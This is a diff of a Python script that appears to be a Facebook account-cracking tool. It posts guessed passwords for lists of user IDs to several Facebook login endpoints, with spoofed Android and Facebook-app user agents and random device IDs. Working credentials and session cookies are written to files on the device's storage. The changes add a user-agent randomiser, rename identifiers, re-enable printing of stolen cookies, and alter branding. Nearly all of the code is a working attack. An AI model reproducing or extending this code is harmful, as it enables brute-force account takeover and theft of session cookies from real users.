@@ -326,6 +326,33 @@ def ua():
     ua_ = random.choice([vivo_ua, infinix_ua, realme_ua, redmi_ua, oppo_ua, itel_ua, nokia_ua, samsung_ua])
     return ua_
 
+def ua_api():
+    facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
+    fbbv = str(random.randint(10000000, 66666666))
+    fbrv = str(random.randint(0, 999999999))
+    density = random.choice(['2.0', '2.5', '3.0'])
+    width = random.choice(["720", "1080", "1280", "1440"])
+    height = random.choice(["720", "1080", "1280", "1440", "1920"])
+    user_agents = [
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Samsung_SM-G960F;FBSV/10.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Xiaomi_MI8;FBSV/11.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/OnePlus_7T;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/Huawei_P30;FBSV/10.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Google_Pixel_5;FBSV/11.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Nokia;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia_7.2;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/LG;FBBD/LG;FBPN/com.facebook.katana;FBDV/LG_V40;FBSV/10.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/Vivo_V15;FBSV/11.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Oppo_F11;FBSV/10.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Realme_5;FBSV/11.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/Sony_Xperia_XZ;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/HTC;FBBD/HTC;FBPN/com.facebook.katana;FBDV/HTC_U11;FBSV/10.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto_G6;FBSV/11.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Lenovo;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo_K8;FBSV/10.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Alcatel;FBBD/Alcatel;FBPN/com.facebook.katana;FBDV/Alcatel_3;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]",
+        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/MTN-CG;FBMF/Sharp;FBBD/Sharp;FBPN/com.facebook.katana;FBDV/Sharp_Aquos;FBSV/10.0;FBOP/1;FBCA/arm64-v8a:]"]
+    return random.choice(user_agents)
+
 red = "\033[1;31m"
 green = "\033[1;32m"
 yellow = "\033[1;33m"
@@ -383,14 +410,14 @@ def get_current_location():
         return None, None
 # Example usage
 current_city, current_country = get_current_location()
-def get_ATOMice_info(prop_name):
+def get_Device_info(prop_name):
     try:
         result = subprocess.run(['getprop', prop_name], capture_output=True, text=True, check=True)
         return result.stdout.strip()
     except subprocess.CalledProcessError as e:
         print(f"Error retrieving {prop_name}: {e}")
         return None
-manufacturer_name = get_ATOMice_info('ro.product.manufacturer')
+manufacturer_name = get_Device_info('ro.product.manufacturer')
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 os.system("xdg-open ")
 os.system("clear")
@@ -485,7 +512,7 @@ def linex():
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 def SUMON_time():
-    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] ATOMice     : {manufacturer_name}-android-v-{android_version}")
+    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Device     : {manufacturer_name}-android-v-{android_version}")
     print(f"\033[1;32m[\033[1;31m✓\033[1;32m] sim card   : {ahydra}")
     print(f"\033[1;32m[\033[1;31m✓\033[1;32m] location   : {current_city}-{current_country} ")
     print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Date       : {datex} ")
@@ -1085,7 +1112,7 @@ def freefb(uid, name, pwx, tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android zh-cn 8; Redmi X Build/2423.0.015) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.4618.94 RealmeBrowser/35.5.0.812.18.3-gn',
             'x-asbd-id': '129477',
             'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
-            lo = Session.post("https://x.facebook.com/login/ATOMice-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
+            lo = Session.post("https://x.facebook.com/login/Device-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
             log_cookies = Session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
@@ -1131,14 +1158,14 @@ def bapi(uid, name, pwx, tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'ATOMice_id': str(uuid.uuid4()),
+                'Device_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_ATOMice_id': str(uuid.uuid4()),
+                'family_Device_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1165,7 +1192,7 @@ def bapi(uid, name, pwx, tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-Session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-ATOMice-group': '5120',
+                'x-fb-Device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1213,14 +1240,14 @@ def graph(uid, name, pwx, tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'ATOMice_id': str(uuid.uuid4()),
+                'Device_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_ATOMice_id': str(uuid.uuid4()),
+                'family_Device_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1247,7 +1274,7 @@ def graph(uid, name, pwx, tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-Session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'X-FB-ATOMice-group': str(random.randint(2000, 4000)),
+                'X-FB-Device-group': str(random.randint(2000, 4000)),
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1281,7 +1308,7 @@ def mbasic(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [M1-DEV] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [M1==SUMON] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1311,7 +1338,7 @@ def mbasic(uid,pwx,tl):
                 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
             }
             headers = {
-                'User-Agent': ua(),
+                'User-Agent': ua_api(),
                 'Accept-Encoding': 'gzip, deflate',
                 'Connection': 'close',
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -1343,13 +1370,13 @@ def mbasic(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {green}[DEV-OK] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/dev-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        print(f" {green}[ATOM-OK] {uid}|{pw}")
+                        print(f" {green}[COOKIES] {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        print(f" {green}[DEV-OK] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/Dev_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        print(f" {green}[ATOM-OK] {uid}|{pw}")
+                        print(f" {green}[COOKIES] {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                         oks.append(uid)
                         break
             else:
@@ -1462,7 +1489,7 @@ def x(uid,pwx,tl):
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
-            'next': 'https://m.facebook.com/login/save-ATOMice/',
+            'next': 'https://m.facebook.com/login/save-Device/',
             'flow': 'login_no_pin',
             'pass': pw,
             'login': 'Log in'}
@@ -1470,7 +1497,7 @@ def x(uid,pwx,tl):
             'Host': 'd.facebook.com',
             'Connection': 'keep-alive',
             'sec-ch-ua-platform': '"Android"',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Android_ATOMice) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.17 Mobile Safari/537.36',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Android_Device) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.17 Mobile Safari/537.36',
             'sec-ch-ua': '"Chromium";v="130", "Android WebView";v="130", "Not?A_Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
@@ -1482,7 +1509,7 @@ def x(uid,pwx,tl):
             'Accept-Encoding': 'gzip, deflate, br, zstd',
             'Accept-Language': 'en,en-US;q=0.9'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://d.facebook.com/login/ATOMice-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
+            url = "https://d.facebook.com/login/Device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1564,7 +1591,7 @@ def mobile(uid,pwx,tl):
             headers = {
             'Host': 'business.facebook.com',
             'method': 'POST',
-            'path': '/login/ATOMice-based/login/async/',
+            'path': '/login/Device-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -1592,7 +1619,7 @@ def mobile(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://business.facebook.com/login/ATOMice-based/regular/login/?login_attempt=1&lwv=100"
+            url = "https://business.facebook.com/login/Device-based/regular/login/?login_attempt=1&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1660,7 +1687,7 @@ def freeq(uid,pwx,tl):
             headers = {
             'Host': 'm.facebook.com',
             'method': 'POST',
-            'path': '/login/ATOMice-based/login/async/',
+            'path': '/login/Device-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -1789,7 +1816,7 @@ def d(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate',
             'accept-language': 'id-ID, id;q=0.9, en-GB;q=0.8, en;q=0.7,en-US;q=0.6'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/ATOMice-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://m.facebook.com/login/Device-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -2053,7 +2080,7 @@ def cracker(uid, pwx, tl):
             headers = {
             'Host': 'p.facebook.com',
             'method': 'POST',
-            'path': '/login/ATOMice-based/login/async/',
+            'path': '/login/Device-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -2081,7 +2108,7 @@ def cracker(uid, pwx, tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/ATOMice-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://m.facebook.com/login/Device-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
